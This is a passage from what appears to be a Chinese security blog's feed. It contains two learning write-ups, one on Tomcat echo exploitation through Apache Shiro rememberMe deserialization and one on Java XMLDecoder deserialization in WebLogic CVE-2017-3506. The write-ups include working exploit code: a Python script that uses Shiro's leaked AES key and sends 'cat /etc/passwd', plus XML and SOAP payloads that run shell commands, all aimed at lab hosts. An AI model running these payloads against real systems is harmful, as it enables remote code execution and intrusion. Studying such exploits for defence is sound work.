class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.myservlet;<br><br><span class="hljs-keyword">import</span> org.apache.coyote.*;<br><br><span class="hljs-keyword">import</span> javax.servlet.ServletException;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.Writer;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.ArrayList;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TomcatEcho</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">HttpServlet</span> </span>&#123;<br><br>    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doGet</span><span class="hljs-params">(HttpServletRequest reqsdfsdf, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;<br>        <span class="hljs-keyword">boolean</span> flag=<span class="hljs-keyword">false</span>;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            Thread[] threads = (Thread[]) getField(Thread.currentThread().getThreadGroup(),<span class="hljs-string">&quot;threads&quot;</span>);<br><br>            <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt; threads.length;i++)&#123;<br>                Thread thread=threads[i];<br>                String threadName=thread.getName();<br><br>                <span class="hljs-keyword">try</span>&#123;<br>                    Object target= getField(thread,<span class="hljs-string">&quot;target&quot;</span>);<br>                    Object this0=getField(target,<span class="hljs-string">&quot;this$0&quot;</span>);<br>                    Object handler=getField(this0,<span class="hljs-string">&quot;handler&quot;</span>);<br>                    Object global=getField(handler,<span class="hljs-string">&quot;global&quot;</span>);<br><br>                    ArrayList processors=(ArrayList) getField(global,<span class="hljs-string">&quot;processors&quot;</span>);<br><br>                    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; processors.size(); j++) &#123;<br>                        RequestInfo requestInfo = (RequestInfo) processors.get(j);<br>                        <span class="hljs-keyword">if</span>(requestInfo!=<span class="hljs-keyword">null</span>)&#123;<br>                            Request req=(Request) getField(requestInfo,<span class="hljs-string">&quot;req&quot;</span>);<br><br>                            org.apache.catalina.connector.Request request=(org.apache.catalina.connector.Request) req.getNote(<span class="hljs-number">1</span>);<br>                            org.apache.catalina.connector.Response response=request.getResponse();<br><br>                            Writer writer=response.getWriter();<br>                            writer.flush();<br>                            writer.write(<span class="hljs-string">&quot;TomcatEcho&quot;</span>);<br>                            flag=<span class="hljs-keyword">true</span>;<br>                            <span class="hljs-keyword">if</span>(flag)&#123;<br>                                <span class="hljs-keyword">break</span>;<br>                            &#125;<br>                        &#125;<br>                    &#125;<br><br>                &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>                    e.printStackTrace();<br>                &#125;<br>                <span class="hljs-keyword">if</span>(flag)&#123;<br>                    <span class="hljs-keyword">break</span>;<br>                &#125;<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br><br>    &#125;<br><br><br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title">getField</span><span class="hljs-params">(Object obj,String fieldName)</span> <span class="hljs-keyword">throws</span> Exception</span>&#123;<br>        Field field=<span class="hljs-keyword">null</span>;<br>        Class clas=obj.getClass();<br><br>        <span class="hljs-keyword">while</span>(clas!=Object.class)&#123;<br>            <span class="hljs-keyword">try</span>&#123;<br>                field=clas.getDeclaredField(fieldName);<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<span class="hljs-keyword">catch</span> (NoSuchFieldException e)&#123;<br>                clas=clas.getSuperclass();<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (field!=<span class="hljs-keyword">null</span>)&#123;<br>            field.setAccessible(<span class="hljs-keyword">true</span>);<br>            <span class="hljs-keyword">return</span> field.get(obj);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> NoSuchFieldException(fieldName);<br>        &#125;<br><br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>输出成功</p><p><img src="https://z3.ax1x.com/2021/10/27/5blUC6.png" alt="5blUC6.png"></p><h1 id="Tomcat通用回显在Shiro中的利用"><a href="#Tomcat通用回显在Shiro中的利用" class="headerlink" title="Tomcat通用回显在Shiro中的利用"></a>Tomcat通用回显在Shiro中的利用</h1><p>已经有人给ysoserial加上了Tomcat回显的利用链，配合commons-collections k1可以直接在shiro中利用</p><p><a href="https://github.com/zema1/ysoserial/releases">https://github.com/zema1/ysoserial/releases</a></p><p>用vulhub上的shiro环境来测试，用python把生成好的字节码加密一下就行。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> uuid<br><span class="hljs-keyword">import</span> subprocess<br><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">encode_rememberme</span>():</span><br>    popen = subprocess.Popen([<span class="hljs-string">&#x27;java&#x27;</span>, <span class="hljs-string">&#x27;-jar&#x27;</span>, <span class="hljs-string">&#x27;ysoserial-0.0.8-SNAPSHOT-all.jar&#x27;</span>, <span class="hljs-string">&#x27;CommonsCollectionsK1TomcatEcho&#x27;</span>, <span class="hljs-string">&quot;a&quot;</span>], stdout=subprocess.PIPE)<br>    <span class="hljs-comment"># 明文需要按一定长度对齐，叫做块大小BlockSize 这个块大小是 block_size = 16 字节</span><br>    BS = AES.block_size<br>    <span class="hljs-comment"># 按照加密规则按一定长度对齐,如果不够要要做填充对齐</span><br>    pad = <span class="hljs-keyword">lambda</span> s: s + ((BS - <span class="hljs-built_in">len</span>(s) % BS) * <span class="hljs-built_in">chr</span>(BS - <span class="hljs-built_in">len</span>(s) % BS)).encode()<br>    <span class="hljs-comment"># 泄露的key</span><br>    key = <span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span><br>    <span class="hljs-comment"># AES的CBC加密模式</span><br>    mode = AES.MODE_CBC<br>    <span class="hljs-comment"># 使用uuid4基于随机数模块生成16字节的 iv向量</span><br>    iv = uuid.uuid4().<span class="hljs-built_in">bytes</span><br>    <span class="hljs-comment"># 实例化一个加密方式为上述的对象</span><br>    encryptor = AES.new(base64.b64decode(key), mode, iv)<br>    <span class="hljs-comment"># 用pad函数去处理yso的命令输出，生成的序列化数据</span><br>    file_body = pad(popen.stdout.read())<br>    <span class="hljs-comment"># iv 与 （序列化的AES加密后的数据）拼接， 最终输出生成rememberMe参数</span><br>    base64_rememberMe_value = base64.b64encode(iv + encryptor.encrypt(file_body))<br><br>    <span class="hljs-keyword">return</span> base64_rememberMe_value<br><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br><br>    payload = encode_rememberme()<br>    <span class="hljs-comment">#print(&quot;rememberMe=&#123;&#125;&quot;.format(payload.decode()))</span><br><br>    cookie = &#123;<br>        <span class="hljs-string">&quot;rememberMe&quot;</span>: payload.decode()<br>    &#125;<br><br>    header=&#123;<br>        <span class="hljs-string">&quot;Testcmd&quot;</span>:<span class="hljs-string">&quot;cat /etc/passwd&quot;</span>,<br>        <span class="hljs-string">&quot;Testecho&quot;</span>: <span class="hljs-string">&quot;123&quot;</span><br>    &#125;<br><br>    r=requests.get(url=<span class="hljs-string">&quot;http://192.168.248.128:8080/login;jsessionid=30396200999CF64BA54C066DE2F33D97&quot;</span>, cookies=cookie,headers=header,proxies=&#123;<span class="hljs-string">&quot;http&quot;</span>:<span class="hljs-literal">None</span>&#125;)<br>    print(r.headers)<br>    print(r.text)<br></code></pre></td></tr></table></figure><p>成功回显</p><p><img src="https://z3.ax1x.com/2021/10/27/5bla8K.png" alt="5bla8K.png"></p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="http://xiashang.xyz/2020/12/27/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0%E5%9B%9B%EF%BC%88%E5%AE%9E%E6%88%98%E7%AF%87%EF%BC%89/">Shiro反序列化漏洞笔记四（实战篇）</a></p><p><a href="https://xz.aliyun.com/t/8445">深入利用Shiro反序列化漏洞</a></p><p><a href="https://mp.weixin.qq.com/s/5iYyRGnlOEEIJmW1DqAeXw">Java代码执行漏洞中类动态加载的应用</a></p><p><a href="https://xz.aliyun.com/t/7535">tomcat不出网回显连续剧第六集</a></p><p><a href="https://blog.sari3l.com/posts/55ea3bd4/#">Shiro-055 分析&amp;回显</a></p><p><a href="https://lucifaer.com/2020/05/12//">Tomcat通用回显学习</a> </p><p><a href="http://wjlshare.com/archives/1549">Shiro550 漏洞学习（三）：Shiro自身利用链以及更通用的Tomcat回显方案</a></p><p><a href="http://blog.corener.cc/2020/04/28/Tomcat-Echo/">Tomcat 通用回显 &amp; Shiro 回显利用</a></p><p><a href="https://xz.aliyun.com/t/7388#toc-0">基于tomcat的内存 Webshell 无文件攻击技术</a></p><p><a href="https://mp.weixin.qq.com/s?__biz=MzIwNDA2NDk5OQ==&mid=2651374294&idx=3&sn=82d050ca7268bdb7bcf7ff7ff293d7b3">基于全局储存的新思路 | Tomcat的一种通用回显方法研究</a></p><p><a href="https://www.cnblogs.com/unicodeSec/p/13060261.html">tomcat结合shiro无文件webshell的技术研究以及检测方法</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>XMLDecoder反序列化学习</title>
    <link href="/2021/09/30/XMLDecoder%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/"/>
    <url>/2021/09/30/XMLDecoder%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="XMLDecoder"><a href="#XMLDecoder" class="headerlink" title="XMLDecoder"></a>XMLDecoder</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p><code>java.beans.XMLDecoder</code> 是jdk自带的类，主要功能是实现java对象和xml文件之间的转化：</p><ul><li>序列化：将java对象转换成xml文件</li><li>反序列化：把特定格式的xml文件转换成java对象。</li></ul><p>Person类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Person</span> </span>&#123;<br>    String name = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">int</span> age;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getName</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setName</span><span class="hljs-params">(String name)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">getAge</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setAge</span><span class="hljs-params">(<span class="hljs-keyword">int</span> age)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">sayHello</span><span class="hljs-params">()</span></span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;Hello, my name is &quot;</span>+name);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>运行后在本地生成person.xml</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.beans.XMLDecoder;<br><span class="hljs-keyword">import</span> java.beans.XMLEncoder;<br><span class="hljs-keyword">import</span> java.io.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">XMLDecoderTest</span></span>&#123;<br>    <span class="hljs-comment">// 序列化对象到文件person.xml</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">xmlEncode</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> FileNotFoundException </span>&#123;<br>        Person person = <span class="hljs-keyword">new</span> Person();<br>        person.setAge(<span class="hljs-number">18</span>);<br>        person.setName(<span class="hljs-string">&quot;test&quot;</span>);<br>        XMLEncoder xmlEncoder = <span class="hljs-keyword">new</span> XMLEncoder(<span class="hljs-keyword">new</span> BufferedOutputStream(<span class="hljs-keyword">new</span> FileOutputStream(<span class="hljs-string">&quot;person.xml&quot;</span>)));<br>        xmlEncoder.writeObject(person);<br>        xmlEncoder.close();<br>        System.out.println(<span class="hljs-string">&quot;序列化结束！&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">// 反序列化</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">xmlDecode</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> FileNotFoundException </span>&#123;<br>        XMLDecoder xmlDecoder = <span class="hljs-keyword">new</span> XMLDecoder(<span class="hljs-keyword">new</span> BufferedInputStream(<span class="hljs-keyword">new</span> FileInputStream(<span class="hljs-string">&quot;person.xml&quot;</span>)));<br>        Person person = (Person)xmlDecoder.readObject();<br>        xmlDecoder.close();<br>        person.sayHello();<br>        System.out.println(<span class="hljs-string">&quot;反序列化成功!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> FileNotFoundException </span>&#123;<br>        XMLDecoderTest xmlTest = <span class="hljs-keyword">new</span> XMLDecoderTest();<br>        xmlTest.xmlEncode();<br>        xmlTest.xmlDecode();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>person.xml文件内容</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;<br>&lt;java version=<span class="hljs-string">&quot;1.8.0_301&quot;</span> <span class="hljs-class"><span class="hljs-keyword">class</span></span>=<span class="hljs-string">&quot;java.beans.XMLDecoder&quot;</span>&gt;<br> &lt;object <span class="hljs-class"><span class="hljs-keyword">class</span></span>=<span class="hljs-string">&quot;Person&quot;</span>&gt;<br>  &lt;<span class="hljs-keyword">void</span> property=<span class="hljs-string">&quot;age&quot;</span>&gt;<br>   &lt;int&gt;18&lt;/int&gt;<br>  &lt;/void&gt;<br>  &lt;<span class="hljs-keyword">void</span> property=<span class="hljs-string">&quot;name&quot;</span>&gt;<br>   &lt;string&gt;test&lt;/string&gt;<br>  &lt;/void&gt;<br> &lt;/object&gt;<br>&lt;/java&gt;<br><br></code></pre></td></tr></table></figure><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>payload.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">java</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">object</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">array</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.lang.String&quot;</span> <span class="hljs-attr">length</span>=<span class="hljs-string">&quot;1&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">void</span> <span class="hljs-attr">index</span>=<span class="hljs-string">&quot;0&quot;</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>calc.exe<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">void</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">array</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">void</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;start&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">void</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">object</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">java</span>&gt;</span><br></code></pre></td></tr></table></figure><p>反序列化payload.xml</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.beans.XMLDecoder;<br><span class="hljs-keyword">import</span> java.io.BufferedInputStream;<br><span class="hljs-keyword">import</span> java.io.File;<br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        File file=<span class="hljs-keyword">new</span> File(<span class="hljs-string">&quot;payload.xml&quot;</span>);<br>        FileInputStream fileInputStream=<span class="hljs-keyword">new</span> FileInputStream(file);<br>        BufferedInputStream bufferedInputStream=<span class="hljs-keyword">new</span> BufferedInputStream(fileInputStream);<br>        XMLDecoder xmlDecoder=<span class="hljs-keyword">new</span> XMLDecoder(bufferedInputStream);<br>        xmlDecoder.readObject();<br>        xmlDecoder.close();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>执行成功</p><p><img src="https://z3.ax1x.com/2021/09/30/4oOC8S.png" alt="4oOC8S.png"></p><h1 id="CVE-2017-3506"><a href="#CVE-2017-3506" class="headerlink" title="CVE-2017-3506"></a>CVE-2017-3506</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>参考之前的文章：<a href="https://sp4zcmd.github.io/2021/07/24/Weblogic%E5%AD%A6%E4%B9%A0%EF%BC%9AT3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA">https://sp4zcmd.github.io/2021/07/24/Weblogic%E5%AD%A6%E4%B9%A0%EF%BC%9AT3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA</a></p><h2 id="漏洞概要"><a href="#漏洞概要" class="headerlink" title="漏洞概要"></a>漏洞概要</h2><p>影响范围</p><ul><li>WebLogic 10.3.6.0</li><li>WebLogic 12.1.3.0</li><li>WebLogic 12.2.1.0</li><li>WebLogic 12.2.1.1</li><li>WebLogic 12.2.1.2</li></ul><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>用创建文件的方式验证</p><p>POST数据包</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs xml">POST /wls-wsat/CoordinatorPortType HTTP/1.1<br>Host: 192.168.248.128:7001<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8<br>Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br>Accept-Encoding: gzip, deflate<br>Content-Type: text/xml<br>Content-Length: 605<br>Origin: http://192.168.248.128:7001<br>Connection: close<br>Referer: http://192.168.248.128:7001/wls-wsat/CoordinatorPortType<br>Upgrade-Insecure-Requests: 1<br><br><span class="hljs-tag">&lt;<span class="hljs-name">soapenv:Envelope</span> <span class="hljs-attr">xmlns:soapenv</span>=<span class="hljs-string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">soapenv:Header</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">work:WorkContext</span> <span class="hljs-attr">xmlns:work</span>=<span class="hljs-string">&quot;http://bea.com/2004/06/soap/workarea/&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">java</span> <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;1.4.0&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.beans.XMLDecoder&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">void</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">array</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.lang.String&quot;</span> <span class="hljs-attr">length</span>=<span class="hljs-string">&quot;3&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">void</span> <span class="hljs-attr">index</span>=<span class="hljs-string">&quot;0&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>/bin/bash<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">void</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">void</span> <span class="hljs-attr">index</span>=<span class="hljs-string">&quot;1&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>-c<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">void</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">void</span> <span class="hljs-attr">index</span>=<span class="hljs-string">&quot;2&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>touch /tmp/CVE-2017-3506<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">void</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">array</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">void</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;start&quot;</span>/&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">void</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">java</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">work:WorkContext</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">soapenv:Header</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">soapenv:Body</span>/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">soapenv:Envelope</span>&gt;</span><br></code></pre></td></tr></table></figure><p>发送payload</p><p><img src="https://z3.ax1x.com/2021/09/30/4oOS4f.png" alt="4oOS4f.png"></p><p>创建成功</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">docker</span> exec weblogic<span class="hljs-number">1036</span>jdk<span class="hljs-number">7</span>u<span class="hljs-number">21</span> ls /tmp<br></code></pre></td></tr></table></figure><p><img src="https://z3.ax1x.com/2021/09/30/4oLxEt.png" alt="4oLxEt.png"></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>先在<code>ProcessBuilder.start</code>处打一个断点</p><p><img src="https://z3.ax1x.com/2021/09/30/4oLzUP.png" alt="4oLzUP.png"></p><p>查看调用栈</p><p><img src="https://z3.ax1x.com/2021/09/30/4oLjHI.png" alt="4oLjHI.png"></p><p>1.</p><p><code>/server/lib/weblogic.jar/weblogic/wsee/jaxws/workcontext/WorkContextServerTube.class#processRequest</code></p><p>传入的xml数据在processRequest进行处理，var1就是我们传入的xml数据。var2和var3会获取并判断payload中的xml头，也就是</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs groovy">&lt;<span class="hljs-attr">soapenv:</span>Envelope <span class="hljs-attr">xmlns:</span>soapenv=<span class="hljs-string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span>&gt; &lt;<span class="hljs-attr">soapenv:</span>Header&gt;<br>&lt;<span class="hljs-attr">work:</span>WorkContext <span class="hljs-attr">xmlns:</span>work=<span class="hljs-string">&quot;http://bea.com/2004/06/soap/workarea/&quot;</span>&gt;<br></code></pre></td></tr></table></figure><p>然后进入readHeaderOld</p><p><img src="https://z3.ax1x.com/2021/09/30/4oOADs.png" 